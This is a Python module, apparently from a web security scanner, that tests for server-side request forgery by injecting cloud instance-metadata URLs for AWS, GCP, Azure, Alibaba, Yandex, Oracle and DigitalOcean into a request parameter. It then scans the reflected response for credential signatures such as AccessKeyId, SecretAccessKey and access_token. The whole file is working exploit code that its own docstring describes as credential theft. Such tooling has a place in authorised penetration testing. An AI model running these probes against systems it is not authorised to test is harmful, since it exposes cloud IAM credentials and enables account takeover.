"""Response-based SSRF → cloud metadata credential theft.

The blind ``ssrf_probe`` plants an OAST canary; this is its **response-based**
sibling for a *full-read* SSRF (the app reflects the fetched content). It injects
each cloud provider's instance-metadata URL into a parameter and scans the response
for that provider's credential signature — the Capital One pattern. Targets cover
AWS / GCP / Azure / Alibaba / Yandex / Oracle / DigitalOcean, each with the exact
host + required header + credential path.

Caveat: providers that require a request header (GCP ``Metadata-Flavor``, Azure
``Metadata``, Oracle ``Authorization``) only leak if the *vulnerable* server
forwards our header to the metadata service; the headerless providers (AWS IMDSv1,
Alibaba, DigitalOcean) work purely response-based.
"""

from __future__ import annotations

from collections.abc import Callable

from ..net.http import HttpClient
from .inject import with_param as inject_param

# provider, metadata URL, (header, value) or None, credential signatures to match.
CLOUD_METADATA_TARGETS: list[dict] = [
    {"provider": "AWS (IAM creds)", "header": None,
     "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "signatures": ["AccessKeyId", "SecretAccessKey", "security-credentials"]},
    {"provider": "AWS (metadata root)", "header": None,
     "url": "http://169.254.169.254/latest/meta-data/",
     "signatures": ["ami-id", "instance-id", "hostname", "iam"]},
    {"provider": "GCP", "header": ("Metadata-Flavor", "Google"),
     "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
     "signatures": ["access_token", "token_type"]},
    {"provider": "Yandex Cloud (GCE-flavored)", "header": ("Metadata-Flavor", "Google"),
     "url": "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
     "signatures": ["access_token", "token_type"]},
    {"provider": "Azure", "header": ("Metadata", "true"),
     "url": ("http://169.254.169.254/metadata/identity/oauth2/token"
             "?api-version=2018-02-01&resource=https://management.azure.com/"),
     "signatures": ["access_token", "client_id"]},
    {"provider": "Alibaba Cloud", "header": None,
     "url": "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
     "signatures": ["AccessKeyId", "SecurityToken", "security-credentials"]},
    {"provider": "Oracle OCI", "header": ("Authorization", "Bearer Oracle"),
     "url": "http://192.0.0.192/opc/v2/instance/",
     "signatures": ["compartmentId", "ociAdName", "canonicalRegionName"]},
    {"provider": "DigitalOcean", "header": None,
     "url": "http://169.254.169.254/metadata/v1.json",
     "signatures": ["droplet_id", "interfaces", "region"]},
]


def scan_metadata_leak(target: dict, body: str) -> list[str]:
    """Which of *target*'s credential signatures appear in *body* (case-insensitive)."""

    low = (body or "").lower()
    return [s for s in target["signatures"] if s.lower() in low]


async def probe_ssrf_metadata(client: HttpClient, url: str, param: str, *,
                              method: str = "GET",
                              scope_check: Callable[[str], bool] | None = None) -> list[dict]:
    """Inject each cloud metadata URL into *param* and flag providers whose
    credential signature is reflected back."""

    m = method.upper()
    findings: list[dict] = []
    for tgt in CLOUD_METADATA_TARGETS:
        tu, tb = inject_param(url, param, tgt["url"], m)
        headers = {tgt["header"][0]: tgt["header"][1]} if tgt["header"] else None
        r = await client.fetch(tu, method=m, body=tb, headers=headers,
                               follow_redirects=True, timeout=12.0, scope_check=scope_check)
        if r.status is None:
            continue
        matched = scan_metadata_leak(tgt, r.text(limit=50_000))
        if matched:
            findings.append({
                "provider": tgt["provider"], "metadata_url": tgt["url"],
                "matched_signatures": matched, "severity": "critical", "verdict": "confirmed",
            })
    return findings
